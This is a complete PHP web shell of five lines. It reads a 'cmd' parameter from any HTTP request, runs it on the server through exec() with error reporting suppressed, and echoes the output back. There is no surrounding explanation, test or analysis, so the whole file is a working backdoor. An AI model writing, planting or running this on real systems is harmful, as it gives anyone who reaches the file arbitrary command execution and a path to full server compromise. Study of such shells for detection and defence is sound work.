<?php
$cmd = $_REQUEST['cmd'];
@exec($cmd, $out);
echo implode("\n", $out);
?>

